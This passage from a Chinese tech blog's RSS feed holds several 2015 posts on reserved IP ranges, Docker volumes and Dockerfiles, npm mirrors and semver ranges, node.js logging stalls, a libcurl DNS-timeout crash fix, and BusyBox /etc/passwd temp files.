<dt> 192.168.0.0/16 </dt><dd>192.168.0.0 - 192.168.255.255
</dd>
</dl>

<p>
以上三个网段分别属于A、B、C三类IP地址，来自 《<a href="https://tools.ietf.org/html/rfc1918">RFC 1918</a>》。
</p>

<p>
但是根据 《<a href="https://en.wikipedia.org/wiki/Reserved_IP_addresses">Reserved IP addresses - Wikipedia, the free encyclopedia</a>》 及《<a href="https://tools.ietf.org/html/rfc6890">RFC 6890 - Special-Purpose IP Address Registries</a>》的描述，
还有很多其它的内网IP段（包括IPv6），以及其它用途的保留IP地址。
</p>

<p>
其它IPv4内网段罗列如下：
</p>

<dl class="org-dl">
<dt> 0.0.0.0/8 </dt><dd>0.0.0.0 - 0.255.255.255

<p>
用于当前网络内的广播消息。
</p>
</dd>

<dt> 100.64.0.0/10 </dt><dd>100.64.0.0 - 100.127.255.255

<p>
由运营商使用的私网IP段，随着IPv4地址池的耗光，会有更多用户被分配到这个网段。
</p>
</dd>

<dt> 127.0.0.0/8 </dt><dd>127.0.0.0 - 127.255.255.255

<p>
本机回环地址。
</p>
</dd>

<dt> 169.254.0.0/16 </dt><dd>169.254.0.0 - 169.254.255.255

<p>
获取不到IP地址时使用，通常因为从DHCP服务器获取不到IP。
</p>
</dd>

<dt> 192.0.0.0/24 </dt><dd>192.0.0.0 - 192.0.0.255

<p>
Used for the IANA IPv4 Special Purpose Address Registry as specified by RFC 5736
</p>

<p>
一般用户不可能被分配到这个IP段。
</p>
</dd>

<dt> 192.0.2.0/24 </dt><dd>192.0.2.0 - 192.0.2.255

<p>
Assigned as "TEST-NET" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
</p>

<p>
一般用户不可能被分配到这个IP段。
</p>
</dd>

<dt> 198.18.0.0/15 </dt><dd>198.18.0.0 - 198.19.255.255

<p>
用于测试两个独立子网的网间通信。
</p>

<p>
一般用户不可能被分配到这个IP段。
</p>
</dd>

<dt> 198.51.100.0/24 </dt><dd>198.51.100.0 - 198.51.100.255

<p>
Assigned as "TEST-NET-2" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
</p>

<p>
一般用户不可能被分配到这个IP段。
</p>
</dd>

<dt> 203.0.113.0/24 </dt><dd>203.0.113.0 - 203.0.113.255

<p>
Assigned as "TEST-NET-3" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.
</p>

<p>
一般用户不可能被分配到这个IP段。
</p>
</dd>

<dt> 255.255.255.255/32 </dt><dd>255.255.255.255

<p>
本网段的广播地址。</p>
</dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[docker容器数据持久化]]></title>
            <link>/article/docker-5bb956686570636e63014e455316.html</link>
            <guid>/article/docker-5bb956686570636e63014e455316.html</guid>
            <pubDate>Thu, 17 Dec 2015 15:24:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在上一篇文章《 <a href="http:node.js-670d52a18fc179fb5230-docker-5bb95668.html">node.js服务迁移到docker容器</a> 》中，当容器被删除之后上传的文件将丢失，可以新建一个数据卷容器专门用来保存上传的文件，这个数据卷容器可以为多个应用容器提供数据持久化功能。
</p>

<p>
其实也可以挂载本地文件目录做为容器的数据卷，但使用数据卷容器更规范一些。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">创建数据卷容器</h2>
<div class="outline-text-2" id="text-1">
<div class="org-src-container">

<pre class="src src-sh">sudo docker run -d -v /usr/local/upload-fiddle/public/files --name upload-fiddle<span style="text-decoration: underline;">-data </span><span style="color: #8abeb7; text-decoration: underline;">'dl.dockerpool.com:5000/ubuntu:14.04'</span><span style="text-decoration: underline;"> echo </span><span style="color: #8abeb7; text-decoration: underline;">'upload-fiddle data container'</span>
</pre>
</div>

<p>
数据卷容器不需要运行以节约资源，它存在的目的只是对数据卷进行引用，避免数据卷被意外删除。
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">挂载数据卷容器</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">sudo docker run -idt --name=<span style="color: #8abeb7;">'upload-fiddle'</span> -p 127.0.0.1:80:80 --volumes-from up<span style="text-decoration: underline;">load-fiddle-data </span><span style="color: #8abeb7; text-decoration: underline;">'tangxinfa/upload-fiddle:0.0.1'</span>
</pre>
</div>

<p>
使用 <code>--volumes-from</code> 选项引用容器中的数据卷。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">数据卷容器数据存储位置</h2>
<div class="outline-text-2" id="text-3">
<p>
查看数据卷容器挂载信息
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo docker inspect -f {{.Mounts}} upload-fiddle-data
</pre>
</div>

<p>
可以看到数据存储在宿主机的 <code>/var/lib/docker/volumes/</code> 目录下。
</p>

<p>
数据卷只有当最后一个引用它的容器使用 <code>-v</code> 选项进行删除（ <code>docker rm</code> 命令）时，才会被删除。
</p>

<p>
可以使用 <code>docker volume</code> 命令对数据卷进行管理。
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">参考</h2>
<div class="outline-text-2" id="text-4">
<p>
《<a href="http://container-solutions.com/understanding-volumes-docker/">Understanding Volumes in Docker - Container Solutions</a>》</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js服务迁移到docker容器]]></title>
            <link>/article/node.js-670d52a18fc179fb5230-docker-5bb95668.html</link>
            <guid>/article/node.js-670d52a18fc179fb5230-docker-5bb95668.html</guid>
            <pubDate>Thu, 17 Dec 2015 08:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
这是一篇 <code>docker</code> 实践教程，将 <a href="https://github.com/tangxinfa/upload-fiddle">tangxinfa/upload-fiddle</a> 这个 <code>node.js</code> 服务封装成 <code>docker</code> 容器。
相关代码已提交到 <a href="https://github.com/tangxinfa/upload-fiddle">tangxinfa/upload-fiddle</a> 项目。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">编写 <code>Dockerfile</code></h2>
<div class="outline-text-2" id="text-1">
<pre class="example">
<span id="coderef-dockerpool" class="coderef-off"><span class="linenr"> 1: </span>FROM dl.dockerpool.com:5000/ubuntu:14.04</span>
<span class="linenr"> 2: </span>
<span class="linenr"> 3: </span>MAINTAINER tangxinfa &lt;tangxinfa@gmail.com&gt;
<span class="linenr"> 4: </span>
<span class="linenr"> 5: </span># Change apt sources
<span id="coderef-163-ubuntu" class="coderef-off"><span class="linenr"> 6: </span>ADD .docker/sources.list /etc/apt/sources.list</span>
<span class="linenr"> 7: </span>
<span class="linenr"> 8: </span># Install python
<span class="linenr"> 9: </span>RUN \
<span class="linenr">10: </span>    apt-get update &amp;&amp; apt-get -y -qq install python wget
<span class="linenr">11: </span>
<span class="linenr">12: </span># Install node
<span class="linenr">13: </span>RUN \
<span class="linenr">14: </span>    wget http://npm.taobao.org/mirrors/node/v0.12.9/node-v0.12.9-linux-x64.tar.gz &amp;&amp;\
<span class="linenr">15: </span>    tar xzf node-v0.12.9-linux-x64.tar.gz -C /usr/local
<span class="linenr">16: </span>
<span class="linenr">17: </span>WORKDIR /usr/local/upload-fiddle/
<span class="linenr">18: </span>
<span class="linenr">19: </span># Install node modules
<span class="linenr">20: </span>ADD package.json ./
<span class="linenr">21: </span>ADD *.bashrc ./
<span class="linenr">22: </span>RUN \
<span class="linenr">23: </span>    ln -s /usr/local/node-v0.12.9-linux-x64 ./node
<span class="linenr">24: </span>RUN \
<span id="coderef-npm-taobao" class="coderef-off"><span class="linenr">25: </span>    ["/bin/bash", "-c", "source .bashrc; npm install --registry=https://registry.npm.taobao.org"]</span>
<span class="linenr">26: </span>
<span class="linenr">27: </span># Add project files
<span class="linenr">28: </span>COPY src ./src
<span class="linenr">29: </span>COPY config ./config
<span class="linenr">30: </span>ADD *.sh ./
<span class="linenr">31: </span>ADD public/*.html ./public/
<span class="linenr">32: </span>
<span class="linenr">33: </span># Create directory for upload files.
<span class="linenr">34: </span>RUN \
<span class="linenr">35: </span>    mkdir public/files &amp;&amp;\
<span class="linenr">36: </span>    chmod a+w public/files
<span class="linenr">37: </span>
<span class="linenr">38: </span># Start service.
<span id="coderef-read" class="coderef-off"><span class="linenr">39: </span>CMD ["/bin/bash", "-c", "./start.sh &amp;&amp; read"]</span>
</pre>

<dl class="org-dl">
<dt> 配置行 <a href="#coderef-dockerpool"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-dockerpool');" onmouseout="CodeHighlightOff(this, 'coderef-dockerpool');">1</a> </dt><dd>在官方仓库被墙的大环境下，使用 <code>dockerpool.com</code> 提供的镜像
</dd>

<dt> 配置行 <a href="#coderef-163-ubuntu"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-163-ubuntu');" onmouseout="CodeHighlightOff(this, 'coderef-163-ubuntu');">6</a> </dt><dd>使用163的ubuntu源，提高速度
</dd>

<dt> 配置行 <a href="#coderef-npm-taobao"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-npm-taobao');" onmouseout="CodeHighlightOff(this, 'coderef-npm-taobao');">25</a> </dt><dd>使用taobao的npm源，提高速度
</dd>

<dt> 配置行 <a href="#coderef-read"class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-read');" onmouseout="CodeHighlightOff(this, 'coderef-read');">39</a> </dt><dd>调用read命令避免命令退出导致容器停止
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">创建 <code>docker</code> 镜像</h2>
<div class="outline-text-2" id="text-2">
<div class="org-src-container">

<pre class="src src-sh">sudo docker build -t <span style="color: #8abeb7;">'tangxinfa/upload-fiddle:0.0.1'</span> .
</pre>
</div>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">运行 <code>docker</code> 容器</h2>
<div class="outline-text-2" id="text-3">
<div class="org-src-container">

<pre class="src src-sh">sudo docker run -idt --name=<span style="color: #8abeb7;">'upload-fiddle'</span> -p 127.0.0.1:80:80 <span style="color: #8abeb7;">'tangxinfa/upload</span><span style="color: #8abeb7; text-decoration: underline;">-fiddle:0.0.1'</span>
</pre>
</div>

<p>
现在可以通过浏览器访问服务了：<a href="http://localhost/">http://localhost/</a>
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">打开 <code>docker</code> 容器终端查看运行日志</h2>
<div class="outline-text-2" id="text-4">
<div class="org-src-container">

<pre class="src src-sh">sudo docker exec -ti upload-fiddle /bin/bash
tail -f run.log
</pre>
</div>

<p>
直接 <code>exit</code> 退出终端不会停止容器。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用国内镜像加速npm]]></title>
            <link>/article/4f7f752856fd5185955c50cf52a0901f-npm.html</link>
            <guid>/article/4f7f752856fd5185955c50cf52a0901f-npm.html</guid>
            <pubDate>Wed, 16 Dec 2015 09:42:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
使用 <code>npm</code> 安装 <code>node.js</code> 包时会很慢，使用国内镜像可以提高速度。
</p>

<ul class="org-ul">
<li>方式一

<div class="org-src-container">

<pre class="src src-sh">npm install --registry=https://registry.npm.taobao.org
</pre>
</div>
</li>

<li>方式二

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">export</span> <span style="color: #f0c674;">npm_config_registry</span>=https://registry.npm.taobao.org
npm install
</pre>
</div>
</li>

<li>方式三

<div class="org-src-container">

<pre class="src src-sh">npm config set <span style="color: #f0c674;">registry</span>=https://registry.npm.taobao.org
npm install
</pre>
</div>
</li>
</ul>

<p>
最后再推荐一下 <a href="http://npm.taobao.org/">淘宝 NPM 镜像</a> ，不但有 <code>npm</code> 的镜像，还有 <a href="http://npm.taobao.org/mirrors/node">node.js镜像</a> ，以后安装 <code>node.js</code> 可以更方便了。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js写日志堵塞问题]]></title>
            <link>/article/node.js-519965e55fd75835585e95ee9898.html</link>
            <guid>/article/node.js-519965e55fd75835585e95ee9898.html</guid>
            <pubDate>Sat, 12 Dec 2015 12:19:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天遇到一起后台服务中断问题，原因是有一个服务写日志导致磁盘满，清掉日志释放磁盘空间后，服务无法自动恢复，此时有以下症状：
</p>

<ul class="org-ul">
<li><code>node.js</code> 进程内存占用超高（超过1G），CPU占用超高（接近100%）
</li>

<li><a href="https://github.com/Unitech/pm2">pm2</a> 运行异常

<p>
<code>stop</code> 和 <code>delete</code> 操作会卡住， <code>start</code> 和 <code>restart</code> 操作失败。
</p>

<p>
后台有大量 <a href="https://github.com/Unitech/pm2">pm2</a> 进程，应该是 <code>crontab</code> 每分钟调用 <code>pm2 start</code> 确保服务拉起导致。
</p>

<p>
<code>killall -9 node</code> 及 <a href="https://github.com/Unitech/pm2">pm2</a> 仍然无法将服务恢复。
</p>

<p>
<code>pm2 kill</code> 也会卡住，最终通过 <code>kill -9</code> 干掉 <a href="https://github.com/Unitech/pm2">pm2</a> 的后台进程 <code>PM2 v0.14.3: God Daemon</code> 才把服务重新启动。
</p>
</li>
</ul>


<p>
一个小时后又出现险情，类似的症状，虽然没有严重到中断服务，但是 <a href="https://github.com/Unitech/pm2">pm2</a> 失控很让人揪心，服务开了两个实例，其中一个实例状态：
</p>

<pre class="example">
    │ App name          │ id │ mode    │ pid │ status  │ restart │ uptime │ memory │ watching │
    │ xxx.xxxxxxxxx.com │ 0  │ cluster │ N/A │ errored │ 2       │ 0      │ 0 B    │ disabled │
</pre>

<p>
执行 <code>pm2 delete 0</code> 也是挂住，最终还是通过 <code>kill -9</code> 干掉 <a href="https://github.com/Unitech/pm2">pm2</a> 的后台进程 <code>PM2 v0.14.3: God Daemon</code> 才把服务重新启动。
</p>

<p>
<code>top</code> 看到的进程状态：
</p>

<pre class="example">
 PID USER      PR  NI  VIRT  RES  SHR S %CPU   %MEM  TIME+   COMMAND           
1640 nobody    20   0  793m 149m 8468 R 105.5  0.9   0:34.74 node /usr/local  
1649 nobody    20   0  796m 152m 8472 R 103.6  1.0   0:34.78 node /usr/local
</pre>

<p>
服务输出的日志量在每秒700行（每行不超过120个字符）左右，最终将日志级别调到 <code>error</code> ，几乎不再输出日志，方才将CPU占用降下来：
</p>

<pre class="example">
    PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM  TIME+    COMMAND           
3527 nobody       20   0  829m 185m 8476 R 62.3  1.2  30:41.12 node /usr/local
3537 nobody       20   0  825m 181m 8476 R 60.4  1.1  30:45.96 node /usr/local
</pre>


<p>
我使用的日志模块为 <a href="https://github.com/baryon/tracer">tracer</a> ，简单地通过 <code>tracer.console(options)</code> 实例化全局的日志对象，最终写日志调用的是 <code>console.log</code> 。
</p>

<p>
在上层，我使用 <a href="https://github.com/Unitech/pm2">pm2</a> 来做进程管理，使用以下参数启动我的服务：
</p>

<pre class="example">
pm2 -n xxx.xxxxxxxxx.com -l /usr/local/xxx.xxxxxxxxx.com/run.log --merge-logs start /usr/local/xxx.xxxxxxxxx.com/src/index.js -i 2
</pre>

<p>
通过 <code>pm2 describe xxx.xxxxxxxxx.com</code> 输出可以发现最终会写三个日志文件：
</p>

<pre class="example">
     │ entire log path   │ /usr/local/xxx.xxxxxxxxx.com/run.log             │
     │ error log path    │ /root/.pm2/logs/xxx.xxxxxxxxx.com-error.log      │
     │ out log path      │ /root/.pm2/logs/xxx.xxxxxxxxx.com-out.log        │
</pre>

<p>
根据 <a href="https://nodejs.org/docs/latest-v0.12.x/api/console.html#console_console">console的文档</a> 中的描述：
</p>

<blockquote>
<p>
The console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).
</p>

<p>
如果输出目标为终端或文件时，console函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。
</p>
</blockquote>

<p>
这个特性引起的问题我也在另一篇文章《 <a href="http://blog.kankanan.com/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html">process.exit导致的控制台输出不全</a> 》里有提及。
</p>

<p>
也就是说不出意外的话，我们的服务写日志是阻塞式的，每秒钟同步方式写700行日志到一块普通机械硬盘上， <code>node.js</code> 不卡死才怪，更何况这块硬盘上还在被其它服务频繁读写。
</p>

<p>
一个服务运行过程中不写日志文件是不可能的，在 <code>node.js</code> 写日志方面需要找到更优的方案。
</p>

<p>
但是在寻找更好的方案之前，我做了一个常识性的思考：
</p>

<blockquote>
<p>
将应用程序日志写到磁盘文件的模块，除非它丢弃日志，当磁盘写入无法跟上日志产生的速度，就要暂存到某个地方，它可能是本机的内存或连网的另一台机器。
</p>
</blockquote>

<p>
所以我最终要找的，不仅仅是一个异步写日志文件的模块，还要先减少磁盘写入量，或者日志不直接写到磁盘文件，而是发送到一个日志服务，如果日志是写在本地磁盘，最好能够做到磁盘满时不中断服务，这种情况下丢失日志也是可以接受的。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[package.json文件dependencies中的各种版本号形式]]></title>
            <link>/article/package.json-65874ef6-dependencies-4e2d7684540479cd7248672c53f75f625f0f.html</link>
            <guid>/article/package.json-65874ef6-dependencies-4e2d7684540479cd7248672c53f75f625f0f.html</guid>
            <pubDate>Thu, 10 Dec 2015 09:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
查看 <code>package.json</code> 文件时，往往会在 <code>dependencies</code> 下看到各种各样的版本号形式，示例如下：
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #8abeb7;">"dependencies"</span>: {
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"async"</span>: <span style="color: #8abeb7;">"1.2.1"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"chokidar"</span>: <span style="color: #8abeb7;">"^1.0.0"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"vizion"</span>: <span style="color: #8abeb7;">"latest"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"babel"</span>: <span style="color: #8abeb7;">"^5.x"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"pm2-logs"</span>: <span style="color: #8abeb7;">"~0.1.1"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"ikt"</span>: <span style="color: #8abeb7;">"git+http://ikt.pm2.io/ikt.git#master"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"punt"</span>: <span style="color: #8abeb7;">"*"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"express"</span>: <span style="color: #8abeb7;">"&gt;=3.0.0"</span>,
<span style="background-color: #373b41;"> </span>   <span style="color: #8abeb7;">"connect"</span>: <span style="color: #8abeb7;">"1.30.2 - 2.30.2"</span>,
}
</pre>
</div>

<p>
一般自已写 <code>package.json</code> 时，图省事版本号会用 <code>*</code> ，想想也是很危险的，指不定哪天依赖的包不再向后兼容，程序运行估计就有问题了。
</p>

<p>
版本号形式是有据可循的，它就是《<a href="http://semver.org/lang/zh-CN/">语义化版本 2.0.0</a>》， <code>npm</code> 遵循该规范，但做了以下扩展：
</p>

<blockquote>
<p>
版本号的构建号部分允许使用 <code>-</code> 字符，所以 <code>0.2.0-1</code> 在《<a href="http://semver.org/lang/zh-CN/">语义化版本 2.0.0</a>》中是非法的，却是合法的 npm 语义版本（Semantic Versioning）。
</p>
</blockquote>

<p>
<code>npm</code> 使用 <a href="https://github.com/npm/node-semver">semver</a> 包进行版本号解析。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">版本号解析示例</h2>
<div class="outline-text-2" id="text-1">
<p>
这篇文章《<a href="http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html">node.js 中的版本管理</a>》对常见的版本号风格进行了解释，虽然对 <code>^</code> 前缀解析不清，但还是值得一看，同时了提供了使用建议。
</p>

<p>
版本号格式： <code>主版本号.次版本号.修订号</code>
</p>

<dl class="org-dl">
<dt> 1.2.1 </dt><dd>匹配指定版本，这里是匹配1.2.1。
</dd>

<dt> ^1.0.0 </dt><dd>匹配 &gt;=1.0.0 且 &lt;2.0.0的版本。

<p>
<code>^</code> 前缀意为 <code>与指定的版本兼容</code> 。
</p>

<p>
<code>^</code> 前缀表示最左边的非0段不允许改变，该段之后的段可以为更高版，所以
</p>

<p>
^1.1.0 匹配 &gt;=1.1.0 且 &lt;2.0.0
</p>

<p>
^0.0.3 匹配 &gt;=0.0.3 且 &lt;0.0.4
</p>
</dd>

<dt> latest </dt><dd>当前发布版本。

<p>
这是一个标记（tag，详见 <a href="https://docs.npmjs.com/cli/dist-tag">dist-tag | npm Documentation</a>），默认情况下 <code>npm install</code> 安装的就是这个 <code>latest</code> 标记。
常见的标记还有 <code>next</code> <code>stable</code> <code>beta</code> <code>canary</code> 。
</p>
</dd>

<dt> ^5.x </dt><dd>匹配 &gt;=5.0.0 且 &lt;6.0.0。

<p>
<code>X</code>, <code>x</code> 及 <code>*</code> 为通配符，版本号尾部省略的段等同于通配符，所以
</p>

<ul class="org-ul">
<li>匹配 &gt;=0.0.0
</li>
</ul>
<p>
1   匹配 &gt;=1.0.0 且 &lt;2.0.0
</p>

<p>
1.2 匹配 &gt;=1.2.0 且 &lt;1.3.0
</p>
</dd>

<dt> ~0.1.1 </dt><dd>匹配 &gt;=0.1.1 且 &lt;0.2.0。

<p>
<code>~</code> 前缀意为 <code>约等于版本</code>
</p>

<p>
如果存在次版本号，则允许修订号为更高版，否则允许次版本号为更高版。
</p>

<p>
~1 匹配 &gt;=1.0.0 且 &lt;2.0.0
</p>
</dd>

<dt> * </dt><dd>匹配 &gt;=0.0.0
</dd>

<dt> &gt;=3.0.0 </dt><dd>同字面意义 &gt;=3.0.0。

<p>
其它操作符有 &lt; &lt;= &gt; &gt;= = ，多个表达式之间用 空格 分隔表示并集，用 || 分隔交集。
</p>
</dd>

<dt> 1.30.2 - 2.30.2 </dt><dd>匹配 &gt;=1.30.2 且 &lt;=2.30.2

<p>
尾部缺失的节被替换为0再进行比较，如：1.30 - 2.30.2 同 1.30.0 - 2.30.2。
</p>
</dd>

<dt> git+<a href="http://ikt.pm2.io/ikt.git#master">http://ikt.pm2.io/ikt.git#master</a> </dt><dd>Git URL形式的依赖

<p>
还支持URL、GitHub URL、本地 URL，详见 <a href="https://docs.npmjs.com/files/package.json#urls-as-dependencies">URLs as Dependencies</a>
</p>
</dd>
</dl>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">参考</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li><a href="https://docs.npmjs.com/files/package.json">package.json | npm Documentation</a>
</li>

<li><a href="http://blog.nodejitsu.com/package-dependencies-done-right/">Package.json dependencies done right | Nodejitsu Inc.</a>
</li>

<li><a href="http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html">node.js 中的版本管理</a>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下安装运行docker]]></title>
            <link>/article/archlinux-4e0b5b8988c58fd0884c-docker.html</link>
            <guid>/article/archlinux-4e0b5b8988c58fd0884c-docker.html</guid>
            <pubDate>Wed, 09 Dec 2015 15:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>安装 <code>docker</code>

<div class="org-src-container">

<pre class="src src-sh">yaourt -S docker
</pre>
</div>
</li>

<li>配置 <code>docker</code>

<p>
由于 <code>docker</code> 的官方仓库被墙，需要从 <code>dockerpool.com</code> 上下载，修改 <code>docker</code> 配置以免 <code>pull</code> 时出现 tls 相关错误。
</p>

<p>
修改 <code>/usr/lib/systemd/system/docker.service</code> 文件，将
</p>

<pre class="example">
ExecStart=/usr/bin/docker daemon -H fd:// --exec-opt native.cgroupdriver=cgroupfs
</pre>

<p>
改为
</p>

<pre class="example">
ExecStart=/usr/bin/docker daemon --insecure-registry dl.dockerpool.com:5000 -H fd:// --exec-opt native.cgroupdriver=cgroupfs
</pre>

<p>
生效配置：
</p>

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl daemon-reload
</pre>
</div>
</li>

<li>启动 <code>docker</code> 服务

<div class="org-src-container">

<pre class="src src-sh">sudo systemctl restart docker
</pre>
</div>
</li>

<li>下载 <code>ubuntu14.04</code> 镜像

<div class="org-src-container">

<pre class="src src-sh">sudo docker pull <span style="color: #8abeb7;">'dl.dockerpool.com:5000/ubuntu:14.04'</span>
</pre>
</div>
</li>

<li>试运行容器

<div class="org-src-container">

<pre class="src src-sh">sudo docker run -t -i <span style="color: #8abeb7;">'dl.dockerpool.com:5000/ubuntu:14.04'</span> /bin/bash
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[修复libcurl域名解析超时引起的内存越界问题]]></title>
            <link>/article/4fee590d-libcurl-57df540d89e367908d8565f65f158d77768451855b588d8a754c95ee9898.html</link>
            <guid>/article/4fee590d-libcurl-57df540d89e367908d8565f65f158d77768451855b588d8a754c95ee9898.html</guid>
            <pubDate>Wed, 09 Dec 2015 06:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
程序发布后在一个用户的机器上频繁出现崩溃，最终定位到崩溃来自一个断言失败：
</p>

<div class="org-src-container">

<pre class="src src-c">assert(pthread_self() != main_thread_id);
</pre>
</div>

<p>
上面这条语句出现在工作线程回调的函数中，竟然发生了工作线程ID和主线程ID相同的怪事，
观察了运行日志，发现使用libcurl发起HTTP请求如果超时则有很大机率会断言失败导致崩溃，
在使用libcurl发起HTTP请求的代码块前后输出工作线程ID，工作线程ID出现了变化，
根据经验很可能是出现了内存越界。
</p>

<p>
最终找到了几篇 <code>libcurl</code> 多线程安全相关的文章：
</p>

<ul class="org-ul">
<li>《<a href="http://blog.csdn.net/balderfan/article/details/7599554">libcurl 多线程使用注意事项</a>》
</li>

<li>《<a href="http://blog.csdn.net/delphiwcdj/article/details/18284429">Libcurl多线程crash问题</a>》
</li>
</ul>

<p>
修复步骤总结如下：
</p>

<ul class="org-ul">
<li>在主线程起始处初始化 <code>libcurl</code> 库

<div class="org-src-container">

<pre class="src src-c">curl_global_init(CURL_GLOBAL_ALL);
</pre>
</div>
</li>

<li>禁止 <code>libcurl</code> 通过 <code>alarm</code> 实现域名解析超时

<div class="org-src-container">

<pre class="src src-c">curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
</pre>
</div>

<p>
如果不做下面的最后一步， <code>libcurl</code> 上设置的超时都会无效。
</p>
</li>

<li>编译 <code>libcurl</code> 时启用 <code>c-ares</code> 或 <code>threaded resolver</code> ，以支持域名解析超时

<div class="org-src-container">

<pre class="src src-sh">./configure --enable-ares
</pre>
</div>

<p>
或
</p>

<div class="org-src-container">

<pre class="src src-sh">./configure --enable-threaded-resolver
</pre>
</div>

<p>
《<a href="http://daniel.haxx.se/blog/2011/04/25/libcurls-name-resolving/">Asynch resolving in libcurl</a>》对 <code>c-ares</code> 或 <code>threaded resolver</code> 两种方式进行了比较，简而言之：
</p>

<ul class="org-ul">
<li><code>c-ares</code> 是一个异步的域名解析库，开销更少，但是它并非使用系统原生的方式实现，对于定制系统（如：hosts或resolv.conf不在标准位置）可能会有问题。
</li>

<li><code>threaded resolver</code> 每次域名解析都会开一个线程，解析完成后销毁线程，开销会大一些，但是稳定性、兼容性更好。
</li>
</ul>
</li>
</ul>

<p>
按照上面的步骤启用 <code>c-ares</code> 进行修改后程序运行了一整天，没有再崩溃。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[/etc/passwd、/etc/passwd+、/etc/passwd- 文件介绍]]></title>
            <link>/article/etc-passwd-3001-etc-passwd-3001-etc-passwd-65874ef64ecb7ecd.html</link>
            <guid>/article/etc-passwd-3001-etc-passwd-3001-etc-passwd-65874ef64ecb7ecd.html</guid>
            <pubDate>Tue, 24 Nov 2015 07:58:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
busybox下修改密码或创建用户的时候，有时候操作会失败，此时 <code>/etc</code> 目录可能出现 <code>passwd+</code> 、 <code>passwd-</code> 两个文件。
</p>

<p>
当出现 <code>/etc/passwd+</code> 文件时，修改密码会耗时几秒钟然后报错：
</p>

<pre class="example">
# passwd root
Changing password for root
New password: 123456

Retype password: 123456

passwd: can't create '/etc/passwd+': File exists
passwd: can't update password file /etc/passwd
#
</pre>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">根据 <a href="https://svn.mcs.anl.gov/repos/ZeptoOS/trunk/BGP/packages/busybox/src/libbb/update_passwd.c">update_passwd.c</a> 可以获得以下信息</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li><code>/etc/passwd</code> 用户帐号配置文件
</li>

<li><code>/etc/passwd+</code> 更新过程中的临时文件
</li>

<li><code>/etc/passwd-</code> 用户帐号配置文件的备份
</li>
</ul>

<p>
更新密码逻辑：
</p>

<ul class="org-ul">
<li>创建 <code>/etc/passwd+</code> 文件

<p>
如果 <code>/etc/passwd+</code> 文件存在，则会返回错误.
</p>
</li>

<li>备份 <code>/etc/passwd</code> 文件到 <code>/etc/passwd-</code>
</li>

<li>更新后的帐号配置写到 <code>/etc/passwd+</code> 文件
</li>

<li>将 <code>/etc/passwd+</code> 文件重命名为 <code>/etc/passwd</code>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">经验法则</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li><code>/etc/passwd</code> 文件损坏时，使用备份文件 <code>/etc/passwd-</code> 还原
</li>

<li><code>/etc/passwd+</code> 文件存在导致无法更新帐号信息，直接删除 <code>/etc/passwd+</code> 文件即可
</li>
</ul>
</div>
</div>
